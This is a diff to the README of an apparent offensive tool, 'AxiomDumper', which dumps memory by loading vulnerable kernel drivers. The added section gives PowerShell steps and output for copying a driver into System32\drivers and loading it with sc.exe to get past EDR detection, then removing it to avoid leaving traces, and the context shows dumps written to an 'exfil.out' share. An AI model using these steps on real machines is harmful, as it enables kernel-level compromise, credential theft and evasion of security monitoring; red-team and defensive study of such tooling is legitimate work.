@@ -80,6 +80,44 @@ Y:\AxiomDumper.exe /mode:dropfile /savepath:out.bin /autoload:reflective /driver
 Y:\AxiomDumper.exe /mode:dropfile /savepath:X:\someshare\exfil.out /driver:winio /autoload:no -> Use the WinIO driver, which must have been loaded manually with sc.exe beforehand
 ```
 
+### Manually loading the driver
+For some EDR, automatically dropping and loading the driver will get detected as a threat (which is correct btw).
+So you will need to manually load it with sc.exe utility:
+```powershell
+PS> cp mah-driver.sys C:\Windows\System32\drivers\sf.sys
+PS> sc.exe create sf type= kernel binpath= C:\Windows\System32\drivers\sf.sys
+[SC] CreateService SUCCESS
+PS> sc.exe start sf
+
+SERVICE_NAME: sf
+        TYPE               : 1  KERNEL_DRIVER
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+        PID                : 0
+        FLAGS              :
+```
+
+NOTE: Always drop the driver in `C:\Windows\System32\drivers`. Not anywhere else.
+
+### PLEASE READ
+If loading the driver manually, please make sure to always unload it before leaving the machine behind you. Those are vulnerable drivers and you should NEVER leave them loaded into any machine, especially during actual engagements. Plus, you might make it more prone to detection leaving those trails behind you.
+```powershell
+PS> sc.exe stop sf
+SERVICE_NAME: sf
+        TYPE               : 1  KERNEL_DRIVER
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+PS> rm C:\Windows\System32\drivers\sf.sys
+PS>
+```
+
 ## Decrypting the dump
 The dump is encrypted with a simple 0x42 key. I'm sure you'll be able to decrypt it just fine, but for ease-of-use the Makefile will also generate a Linux binary: `unxor`.
 
@@ -115,9 +153,6 @@ PS> .\AxiomDumper.exe /mode:dropfile /savepath:out.bin /autoload:no /driver:wini
 ```
 
 WARNING: Always, and I mean ALWAYS double check your `/kernelbase` argument. If it is off by even one byte, you will BSOD.
-
-### Specific case - Crowdstrike Falcon
-TODO
 
 ## Evasion techniques
 
